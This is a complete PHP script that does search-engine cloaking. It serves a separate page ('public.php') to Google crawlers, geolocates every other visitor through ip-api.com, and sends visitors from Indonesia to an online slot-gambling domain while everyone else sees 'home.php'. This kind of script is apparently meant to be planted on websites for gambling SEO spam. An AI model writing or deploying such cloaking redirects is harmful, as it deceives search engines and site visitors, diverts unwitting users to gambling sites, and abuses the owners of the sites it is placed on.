<?php

function is_google_bot() {
    $agents = array(
        "Googlebot",
        "Google-Site-Verification",
        "Google-InspectionTool",
        "Googlebot-Mobile",
        "Googlebot-News"
    );

    $ua = $_SERVER["HTTP_USER_AGENT"] ?? '';
    foreach ($agents as $agent) {
        if (stripos($ua, $agent) !== false) {
            return true;
        }
    }

    return false;
}

function get_country_code() {
    $ip = $_SERVER['REMOTE_ADDR'];

    // Ambil info GeoIP dari API bebas (ip-api)
    $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");

    if ($response !== false) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? '';
    }

    return '';
}

// === LOGIKA ===
if (is_google_bot()) {
    echo file_get_contents("public.php");
    exit;
} else {
    $country = get_country_code();

    if (strtoupper($country) === "ID") {
        // Redirect ke domain lu kalau dari Indonesia
        header("Location: https://mpomaxmaju.online/mposlotmaxwin/mposlotmaxwin.html", true, 302);
        exit;
    } else {
        include "home.php";
        exit;
    }
}
?>